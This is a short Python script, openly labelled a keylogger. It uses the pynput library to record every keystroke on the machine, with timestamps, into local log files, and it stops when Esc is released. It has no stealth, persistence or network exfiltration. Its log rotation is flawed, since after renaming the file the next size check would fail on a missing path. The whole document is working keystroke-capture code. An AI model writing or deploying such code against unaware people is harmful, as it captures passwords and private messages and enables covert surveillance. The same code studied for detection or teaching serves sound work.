import os
import logging
from datetime import datetime
from pynput.keyboard import Key, Listener

# Set up logging with rotating log files
log_dir = "logs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Define log file rotation limit (e.g., 1 KB for demonstration)
LOG_FILE_SIZE = 1024  # 1KB
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
log_file = os.path.join(log_dir, f"{timestamp}_keylog.txt")

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s',
    handlers=[
        logging.FileHandler(log_file),
    ]
)

def rotate_log_file():
    # Rotate log file if it exceeds the specified size
    if os.path.getsize(log_file) > LOG_FILE_SIZE:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        new_log_file = os.path.join(log_dir, f"keylog_{timestamp}.txt")
        os.rename(log_file, new_log_file)

def on_press(key):
    rotate_log_file()  # Check if rotation is needed

    # Map special keys for better readability
    if hasattr(key, 'char'):
        logging.info(f"Key pressed: {key.char}")
    else:
        special_keys = {
            Key.space: " [Space] ",
            Key.enter: " [Enter] ",
            Key.backspace: " [Backspace] "
        }
        logging.info(f"Key pressed: {special_keys.get(key, str(key))}")

def on_release(key):
    # Stop logging on Esc key release
    if key == Key.esc:
        logging.info("Keylogger session ended.")
        return False

# Log session start
logging.info("Keylogger session started.")

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
